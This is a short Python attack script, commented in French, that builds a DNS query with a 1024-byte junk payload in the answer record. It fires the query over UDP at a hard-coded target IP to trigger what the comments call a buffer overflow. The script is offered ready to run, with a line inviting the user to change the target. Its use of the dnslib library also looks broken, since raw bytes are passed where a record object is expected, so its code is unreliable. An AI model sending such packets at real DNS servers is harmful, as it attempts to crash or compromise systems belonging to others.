import socket
from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR

def send_malicious_request(target_ip, target_port=53):
    # Prépare une requête DNS avec un RDATA malveillant
    try:
        # Construire l'en-tête de la requête
        header = DNSHeader(id=12345, qr=0, rd=1)
        question = DNSQuestion("example.com", QTYPE.A)

        # Champ malveillant (dépassement de tampon)
        payload = b"A" * 1024  # Taille exagérée pour déclencher un overflow
        rr = RR("example.com", QTYPE.A, rdata=payload, ttl=300)

        # Assemblage de la requête DNS
        dns_record = DNSRecord(header, q=question)
        dns_record.add_answer(rr)

        # Envoi de la requête via UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(dns_record.pack(), (target_ip, target_port))
        print("[*] Requête malveillante envoyée à {}:{}.".format(target_ip, target_port))
        sock.close()

    except Exception as e:
        print("[!] Une erreur s'est produite :", str(e))

# Modifier l'adresse IP de la cible ici
target_ip = "192.168.136.2"
send_malicious_request(target_ip)
